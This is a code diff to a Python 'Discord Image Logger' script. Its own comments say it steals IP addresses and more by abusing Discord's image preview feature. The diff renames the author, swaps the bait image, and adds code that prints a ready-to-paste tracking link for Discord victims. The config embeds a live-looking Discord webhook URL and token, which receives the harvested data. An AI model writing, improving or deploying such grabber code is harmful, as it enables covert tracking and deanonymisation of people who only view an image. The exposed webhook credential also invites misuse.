@@ -9,7 +9,7 @@ import base64
 import json
 import socketserver
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import urlparse, parse_qs, quote  # Added quote for URL encoding
 
 import requests
 import traceback
@@ -17,13 +17,13 @@ import traceback
 # App metadata
 app = "Discord Image Logger"  # which allows you to steal IPs and more by abusing Discord's open original feature
 version = "v2.0"
-author = "Johnis"
+author = "Dekrypt"
 
 # Config from screenshots—updated with your webhook and default image
 config = {
     "webhook": "https://discord.com/api/webhooks/1439639460382773248/7fVQ1_3b2IEabj9rgMYYFfF0Byqu_su4XhdwLlfjEgxbcoU0Ex8Kv6fAsqStgBAqUYlC",
     "image": "https://yoursite.com/imagelogger?url=(url-escaped link to an image here)",  # Base URL template
-    "default_image_url": "https://cdn.openart.ai/stable_diffusion/c27cb4bb2903e1b8ef64c9ee796554c6d63bdd27_2000x2000.webp",  # Your serene landscape as default!
+    "default_image_url": "https://www.windowslatest.com/wp-content/uploads/2024/10/Windows-XP-Bliss-Wallpaper-4K-scaled.jpg",  # Your Bliss wallpaper as default!
     "custom_image": True,  # Allows you to use a URL argument to change the image (SEE README)
     "username": "Image Logger",  # Set this to the name you want the webhook to have
     "color": "0xFF0000",  # Hex Color you want for the embed (Example: Red is 0xFF0000)
@@ -180,9 +180,15 @@ class ImageLoggerHandler(BaseHTTPRequestHandler):
 
 def run(HOST="0.0.0.0", PORT=8080):
     """Run the server."""
+    # Generate a ready-to-use link example with URL encoding
+    base_url = f"http://{HOST}:{PORT}/imagelogger"  # Assumes /imagelogger endpoint (adjust if needed)
+    encoded_default = quote(config['default_image_url'])  # URL-escape the image link
+    ready_link = f"{base_url}?url={encoded_default}"
+    
     print(f"{app} {version} by {author} running on http://{HOST}:{PORT}")
-    print("Link example:", config['image'].replace('(url-escaped link to an image here)', f"{config['default_image_url']}"))
-    print("Default redirect: Your landscape image—logs IP before serving!")
+    print("Base template explanation: Replace 'yoursite.com/imagelogger' with your server URL (e.g., your-public-ip:8080/imagelogger), and the placeholder with a URL-encoded image link.")
+    print(f"Ready-to-share link (using Bliss default): {ready_link}")
+    print("Paste this in Discord—logs IP before serving the image!")
     with HTTPServer((HOST, PORT), ImageLoggerHandler) as httpd:
         httpd.serve_forever()
 
